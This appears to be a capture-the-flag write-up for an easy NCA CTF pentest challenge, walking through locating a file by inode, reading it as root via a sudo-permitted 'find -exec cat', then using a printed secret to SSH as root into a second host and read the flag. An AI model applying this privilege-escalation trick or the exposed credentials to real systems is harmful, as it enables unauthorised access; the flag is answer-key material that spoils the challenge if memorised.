Event: NCA CTF  
Category: #Pentest

---

## ğŸ“Œ Challenge Information

- Points: 208
    
- Difficulty: Easy
    
- Credentials :
    
    - Username: ctfplayer
        
    - Password: ctfplayer
        

---

## ğŸ“ Challenge Description

A random file hidden in server, You have just its index number **3438573** and it is expected that this is enough for a Pentester to get the FLAG.

This challenge requires creating an instance. The instance will live for 120 mins.

---

# ğŸ” Initial Enumeration

### Step 1 â€“ Basic Check

```bash
ls
```

### Step 2 â€“ Check Hidden Files

```bash
ls -a
```

### Step 3 â€“ Additional Enumeration

```bash
pwd
whoami
env
sudo -l
```

---

## ğŸ‘€ Observations

- `find` is allowed with `sudo` without a password:

    ```
    (ALL) NOPASSWD: /usr/bin/find
    ```

- BusyBox version of `find` does **not** support `-isum`.

- The file was referenced only by its inode number: `3438573`.

- The flag had been moved to another server, requiring a secret environment variable.


---

# ğŸš§ Problem Identified

- Hidden file (accessed by inode).

- Permission issue (regular user cannot read the file).

- BusyBox `find` lacks certain options (`-isum`).

- Environment variable trick needed to access the second server.


---

# ğŸ›  Exploitation / Solution

## Method Used

1. Use `sudo find` to locate the file by inode and read its contents:


```bash
sudo find / -inum 3438573 -exec cat {} \;
```

2. This revealed the next server credentials:


```
SSH USERNAME : root
SECRET = amvOeXqtTmxMLkbnqSXOCTLo
HOST : lsd.segfault.net
```

3. Connect to the new server passing the SECRET as environment variable:


```bash
ssh -o "SetEnv SECRET=amvOeXqtTmxMLkbnqSXOCTLo" root@lsd.segfault.net
```

4. List files and read the flag:


```bash
ls
cat flag.txt
```

---

## Alternative Method (If Any)

- Could have used `sudo find / -inum 3438573 -exec less {} \;` to safely preview content without cat.
    
- Using `xargs` to chain commands:
    
    ```bash
    sudo find / -inum 3438573 | xargs cat
    ```
    

---

# ğŸ“¤ Command Used to Retrieve the Flag

```bash
cat flag.txt
```

Output:

```
NCA{Hope_You_Research_To_Get_The_Flag}
```

---

# ğŸš© Final Flag

```
NCA{Hope_You_Research_To_Get_The_Flag}
```

---

# ğŸ§  Key Takeaways

- Using **inode numbers** to locate hidden files.

- Leveraging `sudo` for **privilege escalation**.

- Passing environment variables to SSH sessions for authentication.

- Understanding **BusyBox limitations** vs GNU utilities.


---

# ğŸ“š Skills Practiced

- Linux Enumeration

- Shell Argument Parsing

- File Handling

- Privilege Escalation

- Problem-Solving Strategy


---

# ğŸ Personal Reflection

Next time, I would directly use `sudo find / -inum <inode>` and immediately check the output for any hints about next-stage servers. Recognizing BusyBox limitations early saves time.